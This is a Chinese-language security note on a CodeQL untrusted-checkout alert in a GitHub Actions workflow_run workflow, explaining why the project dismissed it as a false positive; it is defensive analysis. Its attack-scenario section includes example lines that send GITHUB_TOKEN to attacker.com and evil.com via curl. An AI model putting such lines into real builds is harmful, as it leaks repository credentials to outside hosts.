# Workflow Run 安全警告處理：False Positive 分析

## 問題來源

https://github.com/kyomind/WeaMind/security/code-scanning/51

**CodeQL Alert #51**：
- **規則**：`actions/untrusted-checkout/medium`
- **嚴重性**：Warning (Medium)
- **位置**：`.github/workflows/publish-ghcr.yml` (Line 24-31)
- **描述**：Potential unsafe checkout of untrusted pull request on privileged workflow

## 問題本質

### workflow_run 觸發器的安全風險

`workflow_run` 觸發器會在**特權環境**中執行，具有：
- 對 `secrets.GITHUB_TOKEN` 的完整訪問權限
- 可寫入 repository（如果有 `contents: write` 權限）
- 可推送到 GHCR（如果有 `packages: write` 權限）

**潛在攻擊場景**：
如果在特權 workflow 中 checkout 來自 Pull Request 的程式碼並執行，攻擊者可以：

1. **修改 Dockerfile**：
   ```dockerfile
   # 惡意注入
   RUN curl -X POST https://attacker.com/steal \
       -d "token=$GITHUB_TOKEN"
   ```

2. **修改 build scripts**：
   ```bash
   # 在 package.json 或 Makefile 中
   echo $GITHUB_TOKEN | curl -X POST https://evil.com
   ```

3. **推送惡意 image**：
   - 竊取環境變數
   - 植入後門
   - 破壞生產環境

## CodeQL 建議的解決方式：兩階段模式

### 階段 1：不受信任環境（`pull_request` 觸發）

```yaml
name: Receive PR
on: pull_request

jobs:
  build:
    runs-on: ubuntu-latest
    # 沒有 secrets，沒有 write 權限
    steps:
      - uses: actions/checkout@v6

      - name: Build and test
        run: |
          # 執行 PR 的程式碼，但在隔離環境
          npm install
          npm test

      - name: Save results
        run: |
          mkdir -p ./results
          echo "Test passed" > ./results/status.txt

      - uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: results/
```

### 階段 2：特權環境（`workflow_run` 觸發）

```yaml
name: Publish on success
on:
  workflow_run:
    workflows: ["Receive PR"]
    types: [completed]

jobs:
  publish:
    runs-on: ubuntu-latest
    if: github.event.workflow_run.conclusion == 'success'

    permissions:
      packages: write

    steps:
      # 只下載 artifacts，不 checkout PR 程式碼
      - name: Download artifacts
        uses: actions/download-artifact@v4

      # 使用 base branch 的程式碼進行部署
      - uses: actions/checkout@v6
        with:
          ref: main  # 固定使用 main 分支

      - name: Publish
        run: |
          # 使用可信任的程式碼進行發布
          docker build -t image:latest .
          docker push image:latest
```

**安全原則**：
- ✅ 不受信任的程式碼在無特權環境執行
- ✅ 特權環境只執行受信任的程式碼
- ✅ 通過 artifacts 傳遞結果（而非執行 PR 程式碼）

## WeaMind 採用的解決方式：條件過濾

WeaMind 沒有採用兩階段模式，而是使用 **if 條件嚴格過濾**：

```yaml
name: Publish to GHCR
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
    branches: [main]

permissions:
  contents: read
  packages: write

jobs:
  build-and-push:
    # 關鍵防護：多重條件過濾
    if: ${{
      github.event.workflow_run.conclusion == 'success' &&
      github.event.workflow_run.event == 'push' &&
      github.event.workflow_run.head_branch == 'main'
    }}
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v6
        with:
          ref: ${{ github.event.workflow_run.head_sha }}

      - name: Build and push
        # ... 推送 Docker image
```

### 安全機制分析

**三重防護**：

1. **`event == 'push'`**：
   - 只處理 push 事件
   - **拒絕所有 Pull Request**（PR 的 event 是 `pull_request`）
   - 這是核心防護

2. **`head_branch == 'main'`**：
   - 只處理 main 分支
   - 即使是 push，也必須是 main 分支
   - 排除其他分支的 push

3. **`conclusion == 'success'`**：
   - CI 必須成功通過
   - 確保程式碼已經過完整驗證（lint, test, security scan）

### 為什麼這樣也安全？

```bash
攻擊者嘗試：提交 PR with 惡意 Dockerfile
↓
CI workflow 執行（在 pull_request 環境，無特權）
↓
publish-ghcr.yml 檢查條件
↓
event == 'pull_request' ✗（不是 'push'）
↓
Workflow 終止，不執行任何步驟
↓
攻擊失敗 ✅
```

**只有以下場景會執行**：
```bash
開發者 push to main
↓
CI workflow 執行（event: push, branch: main）
↓
CI 成功
↓
publish-ghcr.yml 檢查條件
↓
✓ event == 'push'
✓ branch == 'main'
✓ conclusion == 'success'
↓
Checkout main 的程式碼（受信任）
↓
Build and push image ✅
```

## 為什麼 CodeQL 仍然警告？

### 靜態分析的限制

CodeQL 進行**靜態程式碼分析**，它的檢測邏輯：

1. ✓ 偵測到 `workflow_run` 觸發器
2. ✓ 偵測到 `actions/checkout` 步驟
3. ✓ 偵測到使用 `github.event.workflow_run.head_sha`
4. ✗ 無法理解 `if` 條件的邏輯語義

**CodeQL 無法推理**：
- 不知道 `event == 'push'` 會排除 PR
- 不知道 `head_branch == 'main'` 確保分支安全
- 無法驗證運行時的條件邏輯

**結果**：基於保守原則，發出警告。

### 類似情況

這類似於：
```python
# CodeQL 會警告 "可能的空指針"
def process(data):
    if data is not None:
        return data.upper()  # 實際上安全，但靜態分析無法確定
```

雖然邏輯上安全，但靜態分析工具無法完全理解執行流程。

## 處理建議

### 選項 1：關閉為 False Positive ✅ **推薦**

在 GitHub Security → Code scanning alerts → Alert #51：

**關閉理由**：
```bash
False Positive: Workflow has explicit guards to prevent PR execution.

Security measures:
1. `event == 'push'` - Rejects all pull_request events
2. `head_branch == 'main'` - Only processes main branch
3. `conclusion == 'success'` - Requires CI validation

The checkout is safe as it only runs for trusted main branch commits.
```

**Dismiss as**：`Won't fix` 或 `False positive`

### 選項 2：採用兩階段模式

如果希望完全消除警告，可以重構為兩階段模式（如 CodeQL 建議）：

**優點**：
- ✅ CodeQL 不會再警告
- ✅ 符合業界最佳實踐
- ✅ 更清晰的安全隔離

**缺點**：
- ✗ 增加 workflow 複雜度
- ✗ 需要額外的 artifact 管理
- ✗ 對個人專案可能過度設計

### 選項 3：添加 CodeQL 抑制註解

在 workflow 中添加註解告訴 CodeQL 這是安全的：

```yaml
jobs:
  build-and-push:
    # codeql[actions/untrusted-checkout]: Safe due to explicit event filtering
    if: ${{ github.event.workflow_run.event == 'push' && ... }}
```

（注意：此語法可能不被 GitHub CodeQL 支援，僅為示意）

## 最終決策

**採用選項 1**：關閉為 False Positive

**理由**：
1. **實際安全性充分**：三重條件過濾已經提供足夠保護
2. **簡潔優先**：個人專案不需要過度複雜的架構
3. **維護成本**：兩階段模式增加維護負擔
4. **團隊規模**：個人專案，所有 push to main 都是可信任的

## 關鍵學習

### 何時需要兩階段模式？

✅ **需要採用**：
- 開源專案，接受外部貢獻者 PR
- 多人協作，需要嚴格權限隔離
- 企業環境，合規要求
- PR 需要執行不受信任的程式碼（如 build scripts）

✅ **可以使用條件過濾**：
- 個人專案，PR 數量少且可手動審查
- 團隊小且成員可信
- CI 已有完整的安全掃描
- main 分支有嚴格的保護規則

### 安全清單

無論採用哪種方式，都應確保：

- ☑ 最小權限原則（`permissions:` 只給必要權限）
- ☑ 分支保護規則（main 需要 PR review）
- ☑ CI 包含安全掃描（Bandit, pip-audit 等）
- ☑ Secrets 最小化暴露
- ☑ 定期審查 workflow 權限

## 參考資料

- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [GitHub Actions: workflow_run event](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run)
- [CodeQL: Untrusted checkout rule](https://codeql.github.com/codeql-query-help/actions/actions-untrusted-checkout/)
- WeaMind workflows: [publish-ghcr.yml](../../.github/workflows/publish-ghcr.yml)

---

**決策日期**：2026-01-13
**Alert #51 狀態**：Dismissed as False Positive
**討論參與者**：kyomind, GitHub Copilot
